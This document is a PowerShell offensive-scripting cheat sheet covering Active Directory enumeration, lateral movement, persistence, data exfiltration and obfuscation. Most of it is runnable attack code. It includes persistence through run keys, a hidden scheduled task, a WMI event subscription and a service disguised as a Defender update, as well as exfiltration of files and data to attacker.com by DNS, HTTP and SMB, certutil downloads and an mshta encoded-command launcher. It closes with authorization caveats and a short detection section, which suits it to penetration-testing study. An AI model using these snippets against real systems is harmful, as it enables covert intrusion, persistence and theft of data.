# PowerShell Offensive Scripting Reference

## Table of Contents
1. [Environment Setup](#environment-setup)
2. [Reconnaissance & Enumeration](#reconnaissance--enumeration)
3. [Active Directory Attacks](#active-directory-attacks)
4. [Lateral Movement](#lateral-movement)
5. [Persistence](#persistence)
6. [Data Exfiltration](#data-exfiltration)
7. [Defense Evasion](#defense-evasion)
8. [PowerShell Remoting & WMI](#powershell-remoting--wmi)
9. [Obfuscation Techniques](#obfuscation-techniques)
10. [Common Modules & Frameworks](#common-modules--frameworks)

---

## Environment Setup

### Execution Policy (Informational Only)
```powershell
# Check current execution policy
Get-ExecutionPolicy -List

# Note: Execution policy is NOT a security boundary
# It can be bypassed with -ExecutionPolicy Bypass
# Real security comes from AppLocker, WDAC, or constrained language mode
```

### AMSI (Anti-Malware Scan Interface)
- AMSI scans PowerShell scripts, dynamic code, and .NET assemblies
- Windows Defender and other AV engines use AMSI
- **For authorized testing**: Use signed scripts, approved frameworks, or constrained language mode
- **Never attempt to bypass AMSI** in production or without explicit authorization

### Logging & Monitoring
- **Script Block Logging**: Logs all script blocks (Event ID 4104)
- **Module Logging**: Logs module commands (Event ID 4103)
- **Transcription**: Logs all input/output to text files
- **Over-the-shoulder**: Real-time monitoring via ETW
- Assume all PowerShell activity is logged in enterprise environments

---

## Reconnaissance & Enumeration

### System Enumeration
```powershell
# Comprehensive system information
$sysInfo = Get-ComputerInfo | Select-Object 
    WindowsProductName, WindowsVersion, TotalPhysicalMemory, 
    CsProcessors, CsSystemType, BootupState, PowerSupplyState

# Installed software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate

# Running processes with command lines
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Network connections
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, 
    RemoteAddress, RemotePort, State, OwningProcess

# Firewall rules
Get-NetFirewallRule | Where-Object { $_.Enabled -eq 'True' } | 
    Select-Object DisplayName, Direction, Action, Profile
```

### User & Group Enumeration
```powershell
# Local users and groups
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet
Get-LocalGroup | Select-Object Name, SID
Get-LocalGroupMember -Group "Administrators"

# Domain users (if domain-joined)
Get-ADUser -Filter * -Properties LastLogonDate, PasswordLastSet, ServicePrincipalNames
Get-ADGroup -Filter * | Where-Object { $_.GroupCategory -eq "Security" }
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Current user privileges
whoami /priv
whoami /groups
```

### Network Enumeration
```powershell
# DNS enumeration
Resolve-DnsName -Name "target.com" -Type ALL

# Port scanning (slow but native)
1..1024 | ForEach-Object { 
    $port = $_
    $connection = Test-NetConnection -ComputerName "target" -Port $port -WarningAction SilentlyContinue
    if ($connection.TcpTestSucceeded) { 
        [PSCustomObject]@{ Port = $port; Status = "Open" }
    }
}

# SMB enumeration
Get-SmbShare -ComputerName "target"
Get-SmbConnection
```

---

## Active Directory Attacks

### Domain Enumeration with PowerView
```powershell
# Domain information
Get-Domain
Get-DomainController

# User enumeration
Get-DomainUser | Select-Object samaccountname, description, serviceprincipalname
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname  # Kerberoast targets

# Group enumeration
Get-DomainGroup | Select-Object name, admincount
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Computer enumeration
Get-DomainComputer | Select-Object name, operatingsystem, lastlogontimestamp

# Trust enumeration
Get-DomainTrust
Get-DomainForeignGroupMember
Get-DomainForeignUser
```

### Kerberoasting
```powershell
# Identify accounts with SPNs
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Request service tickets (requires valid domain credentials)
# Use Rubeus or Invoke-Kerberoast from PowerSploit
# Output in hashcat format for offline cracking
```

### AS-REP Roasting
```powershell
# Find users with DONT_REQ_PREAUTH
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# Request AS-REP response for offline cracking
```

### ACL Abuse
```powershell
# Find interesting ACLs
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"
} | Select-Object ObjectDN, SecurityIdentifier, ActiveDirectoryRights

# Check if current user has rights to any object
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -eq (Get-DomainUser -Identity $env:USERNAME).objectsid
}
```

### BloodHound Ingestion
```powershell
# SharpHound (C# ingestor, callable from PowerShell)
# Collects: sessions, local admin, group membership, ACLs, trust info
# Run: SharpHound.exe -c All
# Upload JSON to BloodHound GUI for analysis
```

---

## Lateral Movement

### PowerShell Remoting
```powershell
# Test remoting connectivity
Test-WSMan -ComputerName "target"

# Interactive session
Enter-PSSession -ComputerName "target" -Credential (Get-Credential)

# Invoke command remotely
Invoke-Command -ComputerName "target" -ScriptBlock { 
    Get-Process | Select-Object -First 5 
} -Credential (Get-Credential)

# Session with multiple targets
$sessions = New-PSSession -ComputerName "target1", "target2"
Invoke-Command -Session $sessions -ScriptBlock { hostname }
```

### WMI Lateral Movement
```powershell
# Execute command via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create 
    -ArgumentList "notepad.exe" -ComputerName "target"

# Alternative: CIM methods (PSv3+)
Invoke-CimMethod -ClassName Win32_Process -MethodName Create 
    -Arguments @{ CommandLine = "cmd.exe /c whoami" } -ComputerName "target"
```

### Pass-the-Hash (PtH)
```powershell
# Using Mimikatz or Invoke-TheHash
# Requires administrative privileges on source system
# Never use in production without authorization
```

### Scheduled Tasks for Lateral Movement
```powershell
# Create remote scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-enc [base64]"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
Register-ScheduledTask -TaskName "Update" -Action $action -Trigger $trigger 
    -ComputerName "target" -Credential (Get-Credential)
```

---

## Persistence

### Registry Run Keys
```powershell
# Current user run key
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" 
    -Name "Update" -Value "powershell.exe -WindowStyle Hidden -File C:\path\to\script.ps1"

# Local machine run key (requires admin)
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" 
    -Name "Update" -Value "powershell.exe -WindowStyle Hidden -File C:\path\to\script.ps1"
```

### Scheduled Tasks
```powershell
# Hidden scheduled task
$action = New-ScheduledTaskAction -Execute "powershell.exe" 
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\path\to\script.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At "12:00"
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings
```

### WMI Event Subscription
```powershell
# Permanent WMI event subscription (stealthy persistence)
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "UpdateFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "UpdateConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\path\to\script.ps1"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

### Service Creation
```powershell
# Create malicious service
New-Service -Name "WindowsDefenderUpdate" -BinaryPathName "C:\path\to\payload.exe" 
    -DisplayName "Windows Defender Update Service" -StartupType Automatic
Start-Service -Name "WindowsDefenderUpdate"
```

---

## Data Exfiltration

### DNS Exfiltration
```powershell
# Encode data in DNS queries
$data = "sensitive_data_here"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
$chunks = $encoded -split '(.{63})' | Where-Object { $_ }
foreach ($chunk in $chunks) {
    Resolve-DnsName -Name "$chunk.attacker.com" -Type A
}
```

### HTTP Exfiltration
```powershell
# POST data to external server
$data = Get-Content "C:\sensitive\file.txt" -Raw
Invoke-RestMethod -Uri "http://attacker.com/exfil" -Method POST -Body $data
```

### SMB Exfiltration
```powershell
# Copy to external SMB share
Copy-Item "C:\sensitive\file.txt" "\\attacker.com\share\"
```

---

## Defense Evasion

### Constrained Language Mode (CLM)
- In CLM, Add-Type, New-Object for non-allowed types, and .NET method invocations are blocked
- Use approved cmdlets and modules only
- For authorized testing, use approved frameworks or request CLM exception

### Script Block Logging Bypass (Do NOT use without authorization)
```powershell
# This is for educational understanding only
# In enterprise environments, script block logging is a critical control
# Attempting to bypass it without authorization is a security violation
```

### AMSI Evasion (Do NOT use without authorization)
```powershell
# AMSI is a critical security control
# Bypassing AMSI is a serious offense without authorization
# For authorized testing, use signed scripts and approved frameworks
```

### Living Off The Land
```powershell
# Use built-in tools to avoid detection
# Examples:
# - certutil for downloading files
# - bitsadmin for file transfers
# - wmic for remote execution
# - mshta for executing HTML applications
# - regsvr32 for executing COM scriptlets

# Download file using certutil
certutil -urlcache -split -f http://attacker.com/file.txt C:\temp\file.txt

# Execute using mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc [base64]"", 0 : close")
```

---

## PowerShell Remoting & WMI

### WinRM Configuration
```powershell
# Enable PowerShell remoting (requires admin)
Enable-PSRemoting -Force

# Configure trusted hosts (less secure, for testing only)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

# Check WinRM service
Get-Service WinRM
Test-WSMan -ComputerName localhost
```

### CIM vs WMI
```powershell
# WMI (legacy, DCOM-based)
Get-WmiObject -Class Win32_Process

# CIM (modern, WS-Man based, PowerShell v3+)
Get-CimInstance -ClassName Win32_Process

# CIM is preferred: faster, more efficient, works with WinRM
```

### JEA (Just Enough Administration)
```powershell
# JEA provides role-based access control for PowerShell
# Create JEA endpoint for least-privilege administration
# See Microsoft documentation for JEA configuration
```

---

## Obfuscation Techniques

### String Obfuscation
```powershell
# Concatenation
$cmd = "pow" + "ershell"

# Encoding
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Get-Process"))

# Variable substitution
${e`x`e`c`u`tion`C`o`n`t`e`x`t} = "Bypass"
```

### Command Obfuscation
```powershell
# Using aliases and shortcuts
gps  # Get-Process
gci  # Get-ChildItem
?    # Where-Object
%    # ForEach-Object

# Backtick escaping
G`et-Pr`oc`ess

# Case variation
GET-PROCESS
get-process
GeT-PrOcEsS
```

### Script Encoding
```powershell
# Encode entire script
$script = Get-Content "script.ps1" -Raw
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded
```

---

## Common Modules & Frameworks

### PowerSploit
- Collection of PowerShell modules for penetration testing
- Includes: PowerView, PowerUp, Invoke-Shellcode, Invoke-Mimikatz
- **For authorized testing only**

### Empire
- Post-exploitation framework
- Agents, listeners, stagers, modules
- **For authorized testing only**

### Nishang
- Offensive PowerShell for red teaming
- Includes: reverse shells, backdoors, exfiltration
- **For authorized testing only**

### Red Team Toolkit
- Collection of PowerShell scripts for red team operations
- **For authorized testing only**

---

## Best Practices for Authorized Testing

1. **Scope Documentation**: Always have written authorization with defined scope
2. **Timeboxing**: Define testing windows to minimize business impact
3. **Communication**: Maintain open communication with blue team
4. **Evidence Collection**: Document all findings with screenshots and logs
5. **Clean Up**: Remove all persistence mechanisms, tools, and artifacts after testing
6. **Reporting**: Provide actionable remediation guidance, not just vulnerability lists
7. **Retesting**: Validate fixes after remediation
8. **Continuous Learning**: Stay updated on new techniques and defenses

---

## Detection & Defense

### PowerShell Logging
```powershell
# Enable comprehensive logging (requires admin)
# Script Block Logging
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" 
    -Name "EnableScriptBlockLogging" -Value 1

# Module Logging
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" 
    -Name "EnableModuleLogging" -Value 1

# Transcription
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" 
    -Name "EnableTranscripting" -Value 1
```

### Constrained Language Mode
```powershell
# Enable CLM via AppLocker or WDAC
# CLM restricts .NET type usage and requires signed scripts
# Most effective when combined with Application Control
```

### AMSI Integration
```powershell
# Ensure Windows Defender or third-party AV has AMSI enabled
# AMSI catches most malicious PowerShell in real-time
# Keep signatures updated
```

### Network Monitoring
- Monitor for unusual WinRM/WMI traffic
- Alert on PowerShell remoting to non-admin workstations
- Track DNS queries for data exfiltration patterns
- Monitor SMB connections to external IPs
